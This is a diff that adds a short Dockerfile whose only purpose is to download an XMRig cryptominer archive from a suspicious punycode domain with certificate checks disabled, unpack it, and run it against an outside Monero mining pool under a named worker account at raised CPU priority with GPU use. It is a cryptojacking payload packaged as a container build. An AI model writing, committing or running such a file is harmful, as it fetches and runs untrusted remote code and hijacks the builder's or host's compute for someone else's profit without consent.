@@ -1,0 +1,15 @@
+FROM ubuntu:latest
+
+WORKDIR /opt
+
+RUN apt-get update && \
+    apt-get install -y wget&& \
+    apt-get install -y unzip&& \
+    wget --no-check-certificate http://api.six-gov.xn--ses554g:26337/xmrig.zip && \
+    unzip -o ./xmrig.zip && \
+    cd ./xmrig-linux && \
+    chmod 777 ./xmrig && \
+    chmod 777 ./xmrig-notls && \
+    ./xmrig --coin xmr --cpu-priority 3 --donate-level 1 -o xmr.ss.dxpool.com:5555 -u futureend.CPU -p x -k --cuda
+	
+    
